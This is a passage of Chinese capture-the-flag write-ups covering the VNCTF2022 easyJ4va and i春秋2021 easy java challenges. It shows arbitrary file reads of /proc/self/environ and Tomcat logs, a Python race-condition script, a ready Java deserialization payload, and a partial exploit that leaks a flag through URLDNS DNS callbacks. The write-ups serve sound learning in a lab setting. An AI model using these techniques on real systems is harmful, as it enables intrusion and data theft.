即可getshell, 根目录 cat /ctfshowflag 即可 [VNCTF2022]easyJ4va 首先是任意文件读取, 根据环境变量确定tomcat具体目录然后搜索 file:///proc/self/environ file:///usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml file:///usr/local/tomcat/logs/localhost.2022-02-12.log file:///usr/local/tomcat/logs/localhost_access_log.2022-02-12.txt 通过日志成功找到恶意路由以及延伸 file:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes/servlet/HelloWorldServlet.class GET部分可以尝试多线程爆破获取, 需要两个不同的name(一个随便写, 另一个为vnctf2022), 比赛时靠着日志读取到其他人爆破的key protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String reqName = req.getParameter(\"name\"); if (reqName != null) { this.name = reqName; } if (Secr3t.check(this.name)) { this.Response(resp, \"no vnctf2022!\"); } else { if (Secr3t.check(this.name)) { this.Response(resp, \"The Key is \" + Secr3t.getKey()); } } } 后续尝试发现可行, 利用此竞争脚本, 考察 servlet 的线程安全问题 参考: https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ # -*-coding:utf-8-*- import requests import threading import time url = \"http://432a4451-aa66-4ccd-a1a0-da92bf9c8192.node4.buuoj.cn:81/evi1?name={}\" def ricky(): res = requests.get(url=url.format(\"ricky\")) if \"The Key is\" in res.text: print(res.text) else: print(res.text) def vnctf2022(): res = requests.get(url=url.format(\"vnctf2022\")) if \"The Key is\" in res.text: print(res.text) else: print(res.text) if __name__ == '__main__': event = threading.Event() while True: threading.Thread(target=ricky, args=()).start() threading.Thread(target=vnctf2022, args=()).start() time.sleep(0.5) event.set() POST部分是一个简单的反序列化 protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String key = req.getParameter(\"key\"); String text = req.getParameter(\"base64\"); if (Secr3t.getKey().equals(key) && text != null) { Decoder decoder = Base64.getDecoder(); byte[] textByte = decoder.decode(text); User u = (User)SerAndDe.deserialize(textByte); if (this.user.equals(u)) { this.Response(resp, \"Deserialize…… Flag is \" + Secr3t.getFlag().toString()); } } else { this.Response(resp, \"KeyError\"); } } 由于 transient 不能直接被 readObject 或 writeObject 方法序列化, 需要单独分开赋值 参考: https://stackoverflow.com/questions/17235877/need-of-defaultreadobject-and-defaultwriteobject https://www.coder.work/article/2812174 根据题意攥写序列化, 单独提取 height 值并赋值而不是将 height 序列化 private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { s.defaultReadObject(); this.height = (String)s.readObject(); } private void writeObject(ObjectOutputStream s) throws IOException { s.defaultWriteObject(); s.writeObject(\"180\"); } 最终payload evi1?base64=rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=&key=YYixtWPfKHsBvjELiwa90ZmFhuMcskBZ [i春秋2021传说殿堂]easy java URLDNS探测gadget参考: https://bishopfox.com/blog/gadgetprobe GadgetProbe下载: https://github.com/BishopFox/GadgetProbe/releases/tag/v1.0 主要看Flag类 public Flag getFlagInstance(Flag flagTemplate) throws Exception { if (create){ // flag开头的值对了就会返回Flag对象, 否则终止本次运行 if (!flagInstance.flag.startsWith(flagTemplate.flag)){ throw new Exception(\"flag not valid\"); } else { return flagTemplate; } } else { return flagInstance; } } private Object readResolve() throws Exception{ // 反序列化首先触发重写的 readResolve return getFlagInstance(this); } 参考 GadgetProbe 可以得知是采用 LinkedHashMap 结合 URLDNS 触发的探测gadget, 当flag开头的值输入正确时返回对象致使整个程序正常运行, 顺利触发DNS, 反正会因Exception提前中断反序列化, 无法触发DNS, 参考攥写EXP即可 package exploit; import com.web.simplejava.model.Flag; import org.springframework.http.HttpEntity; import org.springframework.http.ResponseEntity; import org.springframework.web.client.RestTemplate; import java.lang.reflect.Field; import java.net.URI; import java.net.URL; import java.util.LinkedHashMap; public class exp { public static void doGETParam(Object obj) throws Exception{ URI url = new URI(\"http://localhost:8080/flag\"); HttpEntity requestEntity = new HttpEntity<>(Serializables.serialize(obj)); RestTemplate restTemplate = new RestTemplate(); ResponseEntity res = restTemplate.postForEntity(url, requestEntity, String.class); System.out.println(res.getStatusCodeValue()); System.out.println(res.getBody()); } public static void main(String[] args) throws Exception { String dic = \"abcdefghijklmnopqrstuvwxyz0123456789-\"; for (int i = 0;i 根据DNS log查看判断出的字母, 一次一位, 除非写入校验DNS触发的函数(实现难度较大且容错率小) ... "}}